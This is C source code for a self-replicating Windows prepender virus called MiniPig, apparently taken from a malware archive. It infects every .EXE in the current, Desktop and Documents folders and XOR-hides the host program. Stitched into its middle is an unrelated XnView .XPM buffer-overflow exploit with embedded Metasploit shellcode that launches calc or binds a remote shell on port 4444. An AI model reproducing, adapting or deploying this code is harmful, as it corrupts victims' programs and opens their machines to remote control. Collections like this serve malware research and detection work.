/************************************************************************************
 * This is my new prepender virus ... its name is MiniPig.                          *
 * It works in simple way, nothing of new, look at code.                            *
 * It will infect current directory, desktop and Personal folder ... This could be  *
 * buggy so if you find some bugs you can contact me at: wargame89@yahoo.it         *
 * I declared the virus size as string so you can modify it in an hex-editor ...    *
 * Pay attenction to this value !!!                                                 * 
 * P.S: I tested this only under WinXP and Win98 ... bye :)                         *
 * https://github.com/ytisf/theZoo/blob/master/malware/Source/Original/Win32.MiniPig_Nov2006/ *
 ************************************************************************************/
#include <windows.h>
#include <stdio.h>
#include "stdlib.h"

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char CalcShellcode[] =
"\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x98"
"\x11\xbe\xa7\x83\xeb\xfc\xe2\xf4\x64\xf9\xfa\xa7\x98\x11\x35\xe2"
"\xa4\x9a\xc2\xa2\xe0\x10\x51\x2c\xd7\x09\x35\xf8\xb8\x10\x55\xee"
"\x13\x25\x35\xa6\x76\x20\x7e\x3e\x34\x95\x7e\xd3\x9f\xd0\x74\xaa"
"\x99\xd3\x55\x53\xa3\x45\x9a\xa3\xed\xf4\x35\xf8\xbc\x10\x55\xc1"
"\x13\x1d\xf5\x2c\xc7\x0d\xbf\x4c\x13\x0d\x35\xa6\x73\x98\xe2\x83"
"\x9c\xd2\x8f\x67\xfc\x9a\xfe\x97\x1d\xd1\xc6\xab\x13\x51\xb2\x2c"
"\xe8\x0d\x13\x2c\xf0\x19\x55\xae\x13\x91\x0e\xa7\x98\x11\x35\xcf"
"\xa4\x4e\x8f\x51\xf8\x47\x37\x5f\x1b\xd1\xc5\xf7\xf0\x6f\x66\x45"
"\xeb\x79\x26\x59\x12\x1f\xe9\x58\x7f\x72\xdf\xcb\xfb\x3f\xdb\xdf"
"\xfd\x11\xbe\xa7";


/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char BindShellcode[] =
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5c"
"\x7b\x78\x7f\x83\xeb\xfc\xe2\xf4\xa0\x11\x93\x32\xb4\x82\x87\x80"
"\xa3\x1b\xf3\x13\x78\x5f\xf3\x3a\x60\xf0\x04\x7a\x24\x7a\x97\xf4"
"\x13\x63\xf3\x20\x7c\x7a\x93\x36\xd7\x4f\xf3\x7e\xb2\x4a\xb8\xe6"
"\xf0\xff\xb8\x0b\x5b\xba\xb2\x72\x5d\xb9\x93\x8b\x67\x2f\x5c\x57"
"\x29\x9e\xf3\x20\x78\x7a\x93\x19\xd7\x77\x33\xf4\x03\x67\x79\x94"
"\x5f\x57\xf3\xf6\x30\x5f\x64\x1e\x9f\x4a\xa3\x1b\xd7\x38\x48\xf4"
"\x1c\x77\xf3\x0f\x40\xd6\xf3\x3f\x54\x25\x10\xf1\x12\x75\x94\x2f"
"\xa3\xad\x1e\x2c\x3a\x13\x4b\x4d\x34\x0c\x0b\x4d\x03\x2f\x87\xaf"
"\x34\xb0\x95\x83\x67\x2b\x87\xa9\x03\xf2\x9d\x19\xdd\x96\x70\x7d"
"\x09\x11\x7a\x80\x8c\x13\xa1\x76\xa9\xd6\x2f\x80\x8a\x28\x2b\x2c"
"\x0f\x28\x3b\x2c\x1f\x28\x87\xaf\x3a\x13\x69\x23\x3a\x28\xf1\x9e"
"\xc9\x13\xdc\x65\x2c\xbc\x2f\x80\x8a\x11\x68\x2e\x09\x84\xa8\x17"
"\xf8\xd6\x56\x96\x0b\x84\xae\x2c\x09\x84\xa8\x17\xb9\x32\xfe\x36"
"\x0b\x84\xae\x2f\x08\x2f\x2d\x80\x8c\xe8\x10\x98\x25\xbd\x01\x28"
"\xa3\xad\x2d\x80\x8c\x1d\x12\x1b\x3a\x13\x1b\x12\xd5\x9e\x12\x2f"
"\x05\x52\xb4\xf6\xbb\x11\x3c\xf6\xbe\x4a\xb8\x8c\xf6\x85\x3a\x52"
"\xa2\x39\x54\xec\xd1\x01\x40\xd4\xf7\xd0\x10\x0d\xa2\xc8\x6e\x80"
"\x29\x3f\x87\xa9\x07\x2c\x2a\x2e\x0d\x2a\x12\x7e\x0d\x2a\x2d\x2e"
"\xa3\xab\x10\xd2\x85\x7e\xb6\x2c\xa3\xad\x12\x80\xa3\x4c\x87\xaf"
"\xd7\x2c\x84\xfc\x98\x1f\x87\xa9\x0e\x84\xa8\x17\xac\xf1\x7c\x20"
"\x0f\x84\xae\x80\x8c\x7b\x78\x7f";


char XPMHeaders[]=
"\x2f\x2a\x20\x58\x50\x4d\x20\x2a\x2f\x0d\x0a\x73\x74\x61\x74\x69"
"\x63\x20\x63\x68\x61\x72\x20\x2a\x50\x69\x78\x6d\x61\x70\x5b\x5d"
"\x20\x3d\x20\x7b\x0d\x0a\x22\x35\x30\x39\x20\x34\x33\x38\x20\x32"
"\x35\x36\x20\x33\x22\x2c\x0d\x0a\x22";

int poc(int argc, char* argv[])
{
	FILE* xpmfile;
	char evilbuff[6600];
	int offset=0;

	printf("[+] XnView 1.90.3 .XPM File Buffer Overflow\n");
	printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
	if (argc!=3) {
		printf("[+] Usage: %s Mode <file.xpm>\n",argv[0]);
		printf("[+] Mode is 0 -> run calc.exe\n");
		printf("[+]         1 -> bind shell to port 4444\n");
		return 0;
	}

	memset(evilbuff,'A',6600);
	memcpy(evilbuff,XPMHeaders,sizeof(XPMHeaders)-1);

	//Ret address depends of the way you open the document
	//jmp over EIP + pop pop ret in ??? to defeat SEH protection + jmp back to our shellcode
	//there are 3ret add because files can be accessed in multiple ways
	memcpy(evilbuff+0xead,"\x90\x90\xeb\x05\x2a\x02\xfc\x7f\x41\xe9\x8a\xf1\xff\xff",14);
	memcpy(evilbuff+0x1299,"\x90\x90\xeb\x05\x2a\x02\xfc\x7f\x41\xe9\x9e\xed\xff\xff",14);
	memcpy(evilbuff+0x1799,"\x90\x90\xeb\x05\x2a\x02\xfc\x7f\x41\xe9\x9e\xe8\xff\xff",14);

	if (!atoi(argv[1]))
		memcpy(evilbuff+sizeof(XPMHeaders)+0x10,CalcShellcode,strlen(CalcShellcode));
	else
		memcpy(evilbuff+sizeof(XPMHeaders)+0x10,BindShellcode,strlen(BindShellcode));

	//End of file
	memcpy(evilbuff+0x1916,"\x22\x0d\x0a\x29\x3b\x0d\x0a",7);

	if ((xpmfile=fopen(argv[2],"wb"))==0) {
		printf("[-] Unable to access file.\n");
		return 0;
	}

	fwrite( evilbuff, 1, 6600, xpmfile );
	fclose(xpmfile);
	printf("[+] Done. Have fun!\n");
	return 0;

}


/* This is the signature of an infected file */
#define MINIPIG_SIGNATURE "MiniPig by [WarGame,#eof]"
/* The length of the signature string ! */
#define MINIPIGSIGNATURE_LEN 26
/* This is the key used for xor encryption */
#define XoR 0x4a
/* This will contain the original virus code */
static char *VirusBody = NULL;
/* Original virus size ( Compressed with upx using -9 option )*/
static char *Str_VirSize = "16384"; 
static DWORD VirusSize;       

       /* This it the infection routine */
void Infects(void) 
{
	WIN32_FIND_DATA w32; /* Used by FindFirstFile() and FindNexFile() */
	HANDLE SearchFD = NULL; /* Search handle */
	HANDLE EXE_FD = NULL; /* File handle */
	char *VictimBuf = NULL; /* This is the buffer used in I/O operations */
	char Signature[MINIPIGSIGNATURE_LEN]; /* Used to check signature */
	DWORD readbytes,writtenbytes; /* Used by WriteFile() and ReadFile(); */
	DWORD VictimAttributes; /* Attributes of victim */
	FILETIME WriteTime,LastAccessTime,CreationTime; /* Used to restore victim's time */
	DWORD CryptCnt; /* Used in crypting loop */

		if((SearchFD = FindFirstFile("*.EXE",&w32)) == INVALID_HANDLE_VALUE) 
        {
			return;
		}

		do
		{
			 /* Let's open the found executable! */
			if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
			{
				/* Checks it it has already been infected */
				      SetFilePointer(EXE_FD,-(MINIPIGSIGNATURE_LEN),0,FILE_END);
                      memset(Signature,0,MINIPIGSIGNATURE_LEN);
				/* Reads ( possible ) signature */
					  ReadFile(EXE_FD,Signature,MINIPIGSIGNATURE_LEN,&readbytes,NULL);
                      
				/* Already infected !!! */
					  if(strstr(Signature,MINIPIG_SIGNATURE)) 
					  {
						  CloseHandle(EXE_FD);
						  continue;
					  }
				
				/* Infects it !!! */
					  else 
					  {
						  /* Saves old attributes */
						  VictimAttributes = w32.dwFileAttributes;
						  CopyMemory(&WriteTime,&w32.ftLastWriteTime,sizeof(FILETIME));
						  CopyMemory(&CreationTime,&w32.ftCreationTime,sizeof(FILETIME));
						  CopyMemory(&LastAccessTime,&w32.ftLastAccessTime,sizeof(FILETIME));
					      
						  /* Grows up the victim's size */
                           SetFilePointer(EXE_FD,MINIPIGSIGNATURE_LEN+VirusSize,0,FILE_CURRENT);
						   SetEndOfFile(EXE_FD);
						  /* Closes the file */
						   CloseHandle(EXE_FD);

						   /* Reopens the file */
                           if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
						   {
                                /* Failed to allocate memory ! */
							    if((VictimBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,w32.nFileSizeLow)) == NULL) 
								{
									CloseHandle(EXE_FD);
									continue;
								}
								
								else 
								{
									/* Ok Now we read victim on buffer */
									ReadFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&readbytes,NULL);
									/* Ok overwrites with virus */
									SetFilePointer(EXE_FD,-(w32.nFileSizeLow),0,FILE_CURRENT);
									WriteFile(EXE_FD,VirusBody,VirusSize,&writtenbytes,NULL);
									 
									/* Crypts VictimBuf with simple XoR */
									for(CryptCnt = 0;CryptCnt < w32.nFileSizeLow;CryptCnt++)
									{
										VictimBuf[CryptCnt] ^= XoR;
									}
									
									/* Ok writes the victim at the end */
                                    WriteFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&writtenbytes,NULL);
									/* Writes the signature */
									WriteFile(EXE_FD,MINIPIG_SIGNATURE,MINIPIGSIGNATURE_LEN,&writtenbytes,NULL);
									/* Restores victim's file and attributes */
									SetFileAttributes(w32.cFileName,VictimAttributes);
									SetFileTime(EXE_FD,&CreationTime,&LastAccessTime,&WriteTime);
									/* Closes All and frees memory */
									CloseHandle(EXE_FD);
									GlobalFree(VictimBuf);
									/* DONE ! */
								}
						   }
						  
					  }
			}
		}while(FindNextFile(SearchFD,&w32));

		/* Closes the search */
		FindClose(SearchFD);
}

/* This is used to return to host */
void ReturnToHost(char *mypath) 
{
       HANDLE TotalFD; /* This is the handle used to read the entire file */
       char *TotalBuf = NULL; /* Put the file here */
	   DWORD TotalSize; /* Total size of file */
	   HANDLE HostFD; /* Used to write host's code */
	   DWORD readbytes,writtenbytes; /* As usual ... :) */
	   DWORD DecryptCnt; /* Used for decrypting */
	   char *randChars = "AcGh9Kl6"; /* Used for random name generation */
	   char randName[10]; /* Random name for temp host */
	   STARTUPINFO inf_prog; /* Used for CreateProcess() */
       PROCESS_INFORMATION info_pr; /* the same ... :) */
	          
	   /* Reads entire file */
	    if((TotalFD = CreateFile(mypath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
		{
			/* What is the size of mine ??? */
			TotalSize = GetFileSize(TotalFD,NULL);
			
			/* Allocates memory */
			if((TotalBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,TotalSize)) == NULL) 
			{
				ExitProcess(0);
			}

			/* Reads and puts in buffer */
			ReadFile(TotalFD,TotalBuf,TotalSize,&readbytes,NULL);
			/* Closes file */
			CloseHandle(TotalFD);
			
			/* Builds random name */
			srand(GetTickCount());
            sprintf(randName,"%c%c%c%c%c%c.exe",randChars[rand()%8],randChars[rand()%8],
				randChars[rand()%8],randChars[rand()%8],randChars[rand()%8],randChars[rand()%8]);
			
			/* Creates the temp host file */
			if((HostFD = CreateFile(randName,GENERIC_WRITE,FILE_SHARE_WRITE,NULL
				  ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN,NULL)) != INVALID_HANDLE_VALUE) 
			{
				
				/* Decrypts !!! */
                for(DecryptCnt = VirusSize;DecryptCnt < TotalSize;DecryptCnt++)
				{
					TotalBuf[DecryptCnt] ^= XoR;
				}
				/* Hosts written! */
				SetFilePointer(HostFD,0,0,FILE_BEGIN);
				WriteFile(HostFD,TotalBuf+VirusSize,(TotalSize-VirusSize),&writtenbytes,NULL);
				/* Frees and closes */
				CloseHandle(HostFD);
				GlobalFree(TotalBuf);
				
				/* Returns to host ! */
				memset(&inf_prog,0,sizeof(STARTUPINFO));
                memset(&info_pr,0,sizeof(PROCESS_INFORMATION));
                inf_prog.cb = sizeof(STARTUPINFO);
                inf_prog.dwFlags = STARTF_USESHOWWINDOW;
                inf_prog.wShowWindow = SW_SHOW;

				/* Runs host ! */
				CreateProcess(NULL,randName,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,
                             &inf_prog,&info_pr);
				
				/* Waits and deletes tmp exe */
				WaitForSingleObject(info_pr.hProcess,INFINITE);
				DeleteFile(randName);
				
				/* Exits ! */
				ExitProcess(0);
			}
		}

			else
			{
				ExitProcess(0);
			}
}

/* This is to get special folder */
int GetSpecialFolder(char *path,char *folder) 
{
	HKEY hKey; /* Reg handle */
	DWORD len = MAX_PATH;

	memset(path,0,MAX_PATH);
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",0,KEY_QUERY_VALUE,&hKey) !=
                 ERROR_SUCCESS)
                    {
	                       return 0; /* failed :( */
                    }
  
	/* Puts found path in path buffer */
	if(RegQueryValueEx(hKey,folder,0,NULL,path,&len) != ERROR_SUCCESS)
                    {
		                   RegCloseKey(hKey);
                           return 0;
                    }

	/* Success ! */
	RegCloseKey(hKey);
	return 1;
}

/* The main of virus */
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char MyPath[MAX_PATH];
	HANDLE VirFD = NULL; /* Used to read virus body */
	DWORD readbytes; /* As usual used by ReadFile() */
	DWORD CurrentSize; /* Current size of proggy */
	char CWD[MAX_PATH],OriginalCWD[MAX_PATH]; /* Used to change directory */

	/* Gets its path */
	 GetModuleFileName(NULL,MyPath,MAX_PATH);

	/* Gets its current directory */
	 GetCurrentDirectory(MAX_PATH,OriginalCWD);

	/* Gets Virus Size */
	 VirusSize = atoi((char *)Str_VirSize);
	 
	/* Puts virus body in VirusBody buffer */
	 if((VirFD = CreateFile(MyPath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
	 {
          if((VirusBody = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,VirusSize)) == NULL) 
		  {
			  ExitProcess(0);
		  }

		  /* Reads virus body and puts it in VirusBody */
		  ReadFile(VirFD,VirusBody,VirusSize,&readbytes,NULL);
		  /* Gets the total file size */
		  CurrentSize = GetFileSize(VirFD,NULL);
		  /* Closes virus's handle */
		  CloseHandle(VirFD);
				
	 }

	  /* Error !!! Exits !!! */
	 else 
	 {
		 ExitProcess(0);
     }
	 
	 /* Infects current dir */
	 Infects();

     /* Infects desktop */
	 if(GetSpecialFolder(CWD,"Desktop"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }

	 /* Infects personal folder ( usually named Documents ) */
	 if(GetSpecialFolder(CWD,"Personal"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }
	 
	 
	 /* If we are not in the first generation we return to host ! */
     if(CurrentSize > VirusSize) 
     {
	 SetCurrentDirectory(OriginalCWD);
	 ReturnToHost(MyPath);
	 }
}